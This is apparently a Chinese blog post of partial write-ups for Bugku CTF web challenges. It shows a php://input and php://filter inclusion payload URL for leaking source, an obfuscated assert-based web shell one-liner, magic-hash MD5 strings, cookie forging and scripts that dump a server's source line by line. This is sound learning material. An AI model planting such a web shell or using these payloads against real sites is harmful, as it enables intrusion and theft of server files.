---
title: 'bugku web题目的wp'
date: 2019-02-07
updated: 2019-08-19
category: 'ctf'
tags:
  - 'wp'
lang: 'zh'
draft: false
---
# welcome to bugkuctf

`ctrl + U`查看页面源代码， 如果有 `$user`且 `file_get_contents($user, 'r')` 的 值是 指定的字符串。 就会 `include` `$file` 的内容 。 并且提示是 `hint.php`这个文件

这里涉及到一个怎么把 `get` 方法传入的参数作为一个文件打开。

## php伪协议

这里用到了 `php://input`

但是。。

这就要用到第二个伪协议：  
`php://filter`

我那样传递参数会报错， `include($file)` 只是把 `$file` 这个变量当作文件名包括进去了。 就是含在源代码里， 不是简单地构造一个参数就能达到的。

这就是一个泄露了源码的漏洞了。

最后构造的URL如下：  
`http://123.206.87.240:8006/test1/?txt=php://input&file=php://filter/read=convert.base64-encode/resource=hint.php`

惊叹。  
base64 解密之后的源代码。  

```
<?php  

class Flag{//flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file);
			echo "<br>";
		return ("good");
        }  
    }  
}  
?>
```

代码里面构造了一个类。  
公有变量是 `$file`

继续看一下 `index.php` 的源代码

```php
<?php  
$txt = $_GET["txt"];  
$file = $_GET["file"];  
$password = $_GET["password"];  

if(isset($txt)&&(file_get_contents($txt,'r')==="welcome to the bugkuctf")){  
    echo "hello friend!<br>";  
    if(preg_match("/flag/",$file)){
		echo "ä¸è½ç°å¨å°±ç»ä½ flagå¦";
        exit();  
    }else{  
        include($file);   
        $password = unserialize($password);  
        echo $password;  
    }  
}else{  
    echo "you are not the number of bugku ! ";  
}  

?>  

<!--  
$user = $_GET["txt"];  
$file = $_GET["file"];  
$pass = $_GET["password"];  

if(isset($user)&&(file_get_contents($user,'r')==="welcome to the bugkuctf")){  
    echo "hello admin!<br>";  
    include($file); //hint.php  
}else{  
    echo "you are not admin ! ";  
}  
 -->
```

有几个地方暂时写不到位， 先到这里好了。

# 过狗一句话

很蒙

```php
<?
php $poc="a#s#s#e#r#t";
$poc_1=explode("#",$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s'])
 ?>
```

上面是题目提示的过狗一句话代码。  
然后…后面的不会了

# 字符，正则？

# 前女友

一道很有趣的题目， 就不说题目了， 直接放我的测试代码

```php
<?php
error_reporting(0);
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    echo "$v1</br>";
    var_dump($v1);
    echo "</br>";
    echo md5($v1)."</br>";
    echo "$v2</br>";
    echo md5($v2)."</br>";
    if($v1 != $v2 && md5($v1) == md5($v2)){
        echo "true";
    }
    else
    {
    	echo "false";
    }
}

?>
```

也是第一次发现get还能传递数组（不过当然是一堆的错误）

# MD5 collision

还不太清楚MD5 碰撞是啥， 以后补坑

`payload`  
`120.24.86.145:9009/md5.php?a=s878926199a`

常用的MD5碰撞  

```
QNKCDZO
0e830400451993494058024219903391

s878926199a
0e545993274517709034328855841020

s155964671a
0e342768416822451524974117254469

s214587387a
0e848240448830537924465865611904

s214587387a
0e848240448830537924465865611904

s878926199a
0e545993274517709034328855841020

s1091221200a
0e940624217856561557816327384675

s1885207154a
0e509367213418206700842008763514

s1502113478a
0e861580163291561247404381396064

s1885207154a
0e509367213418206700842008763514

0e861580163291561247404381396064

s1885207154a
0e509367213418206700842008763514

s1836677006a
0e481036490867661113260034900752

s155964671a
0e342768416822451524974117254469

s1184209335a
0e072485820392773389523109082030

s1665632922a
0e731198061491163073197128363787

s1502113478a
0e861580163291561247404381396064

s1836677006a
0e481036490867661113260034900752

s1091221200a
0e940624217856561557816327384675

s155964671a
0e342768416822451524974117254469

s1502113478a
0e861580163291561247404381396064

s155964671a
0e342768416822451524974117254469

s1665632922a
0e731198061491163073197128363787

s155964671a
0e342768416822451524974117254469

s1091221200a
0e940624217856561557816327384675

s1836677006a
0e481036490867661113260034900752

s1885207154a
0e509367213418206700842008763514

s532378020a
0e220463095855511507588041205815

s878926199a
0e545993274517709034328855841020

s1091221200a
0e940624217856561557816327384675

s214587387a
0e848240448830537924465865611904

s1502113478a
0e861580163291561247404381396064

s1091221200a
0e940624217856561557816327384675

s1665632922a
0e731198061491163073197128363787

s1885207154a
0e509367213418206700842008763514

s1836677006a
0e481036490867661113260034900752

s1665632922a
0e731198061491163073197128363787

s878926199a
0e545993274517709034328855841020
```

# 秋名山老司机

```html
<head>
<title>下面的表达式的值是秋名山的车速</title>
<meta charset="UTF-8">
</head>
<p>亲请在2s内计算老司机的车速是多少</p>
<div>1782911879+706686703-1996813020-984998196*1213520247-1805071043*379299795+1623596400-1052850963+2102818407-2101949215=?;</div>
<style>
div,p{
text-align: center;
margin: 0 auto;
}
</style>
```

两秒之内计算出式子中的值， 再提交

菜鸡还不太会写脚本  
参考了dalao们的代码

```python
import requests
import re
url = 'http://120.24.86.145:8002/qiumingshan/'
s = requests.Session()
source = s.get(url)
expression = re.search(r'(\d+[+\-*])+(\d+)', source.text).group()
result = eval(expression)
post = {'value': result}
print(s.post(url, data = post).text)
```

不过还是没搞出来。

---

复习一下`requests`库

```python
import requests
#构造requests对象

s = requests.get(url)
s.post(url,   )

#差不多就这些了
```

# cookies欺骗

然而注意到URL中的line和file时就能做出来了。

```python
#用脚本把代码跑出来
import requests
a=30
for i in range(a):
    url="http://120.24.86.145:8002/web11/index.php?line="+str(i)+"&filename=aW5kZXgucGhw"
    s=requests.get(url)
    print s.text
```

```php
<?php

error_reporting(0);
$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");

$line=isset($_GET['line'])?intval($_GET['line']):0;

if($file=='') header("location:index.php?line=&filename=a2V5cy50eHQ=");
$file_list = array(
'0' =>'keys.txt',
'1' =>'index.php',
);
if(isset($_COOKIE['margin']) && $_COOKIE['margin']=='margin'){       //看这里
 $file_list[2]='keys.php';
 }
if(in_array($file, $file_list)){
$fa = file($file);
echo $fa[$line];
}
?>
```

构造cookie就行啦  
（然而没搞出flag来）

# login4

CBC字节翻转攻击  
放一张经典的图

![](https://raw.githubusercontent.com/xinyongpeng/gitpic/master/bugku0.webp)

据师傅们的wp说是有一个index.php.swp文件存在。  
然而没找到， 先把师傅们找到的源码放上来

```php
<?php
define("SECRET_KEY", file_get_contents('/root/key'));
define("METHOD", "aes-128-cbc");
session_start();
function get_random_iv(){
    $random_iv='';
    for($i=0;$i<16;$i++){
        $random_iv.=chr(rand(1,255));
    }
    return $random_iv;
}
function login($info){
    $iv = get_random_iv();
    $plain = serialize($info);
    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);
    $_SESSION['username'] = $info['username'];
    setcookie("iv", base64_encode($iv));
    setcookie("cipher", base64_encode($cipher));
}
function check_login(){
    if(isset($_COOKIE['cipher']) && isset($_COOKIE['iv'])){
        $cipher = base64_decode($_COOKIE['cipher']);
        $iv = base64_decode($_COOKIE["iv"]);
        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)){
            $info = unserialize($plain) or die("<p>base64_decode('".base64_encode($plain)."') can't unserialize</p>");
            $_SESSION['username'] = $info['username'];
        }else{
            die("ERROR!");
        }
    }
}
function show_homepage(){
    if ($_SESSION["username"]==='admin'){
        echo '<p>Hello admin</p>';
        echo '<p>Flag is $flag</p>';
    }else{
        echo '<p>hello '.$_SESSION['username'].'</p>';
        echo '<p>Only admin can see flag</p>';
    }
    echo '<p><a href="loginout.php">Log out</a></p>';
}
if(isset($_POST['username']) && isset($_POST['password'])){
    $username = (string)$_POST['username'];
    $password = (string)$_POST['password'];
    if($username === 'admin'){
        exit('<p>admin are not allowed to login</p>');
    }else{
        info = array('username'=>username,'password'=>password);
        login(info);
        show_homepage();
    }
}else{
    if(isset($_SESSION["username"])){
        check_login();
        show_homepage();
    }else{
        echo '<body class="login-body">

                <div id="wrapper">
                    <div class="user-icon"></div>
                    <div class="pass-icon"></div>
                    <form name="login-form" class="login-form" action="" method="post">
                        <div class="header">
                        <h1>Login Form</h1>
                        <span>Fill out the form below to login to my super awesome imaginary control panel.</span>
                        </div>
                        <div class="content">
                        <input name="username" type="text" class="input username" value="Username" onfocus="this.value=\'\'" />
                        <input name="password" type="password" class="input password" value="Password" onfocus="this.value=\'\'" />
                        </div>
                        <div class="footer">
                        <input type="submit" name="submit" value="Login" class="button" />
                        </div>
                    </form>
                </div>
            </body>';
    }
}
?>
</html>
```

# 备份是个好习惯

根据以前做题的经验， 备份就是在提示你 存在bak文件  
所以直接输入URL为 `http://123.206.87.240:8002/web16/index.php.bak` 然后下载文件  
代码：

```php
<?php
include_once "flag.php";
ini_set("display_errors", 0);
$str = strstr($_SERVER['REQUEST_URI'], '?');
$str = substr($str,1);
$str = str_replace('key','',$str);
parse_str($str);
echo md5($key1);

echo md5($key2);
if(md5($key1) == md5($key2) && $key1 !== $key2){
    echo $flag."取得flag";
}
?>
```

做代码审计的题目， 还是主要靠自己尝试。

```php
<?php

error_reporting(0);

$str = strstr($_SERVER['REQUEST_URI'], '?');
echo "$str"."</br>";

$str = substr($str, 1);
echo "$str"."</br>";

$str = str_replace('key','', $str);

echo "$str"."</br>";
parse_str($str);

echo "$key1"."</br>";
echo md5($key1);

echo "</br>";
echo md5($key2);

if(md5($key1) == md5($key2) && $key1 !== $key2)
	echo 'flag';

?>
```

上面是我用来测试的代码

构造URL为 `http://localhost/test/test.php?kkeyey1=1&kkeyey2=2`  
输出了这些：  

```
?kkeyey1=1&kkeyey2=2
kkeyey1=1&kkeyey2=2
key1=1&key2=2
1
c4ca4238a0b923820dcc509a6f75849b
c81e728d9d4c2f636f067f89cc14862c
```

之前还很疑惑为什么没有get都能得到变量， 原来是`parse_str`这个函数在起作用。

OK， 现在就是表演的时间了。

# 参考资料

[https://blog.csdn.net/wy\_97/article/details/77431111](https://blog.csdn.net/wy_97/article/details/77431111)  
[https://www.cnblogs.com/Pinging/p/8278168.html](https://www.cnblogs.com/Pinging/p/8278168.html)  
[https://blog.csdn.net/qq\_19861715/article/details/79384018](https://blog.csdn.net/qq_19861715/article/details/79384018)

[https://blog.csdn.net/qq\_39629343/article/details/80696263](https://blog.csdn.net/qq_39629343/article/details/80696263)

[秋名山老司机](https://www.jianshu.com/p/b0a5d72c8bae)  
[cookie欺骗](https://blog.csdn.net/qq_26090065/article/details/81588595)  
[CBC字节翻转攻击](https://blog.csdn.net/csu_vc/article/details/79619309)

[python requests库学习](https://www.cnblogs.com/EvileOn/p/5517235.html)
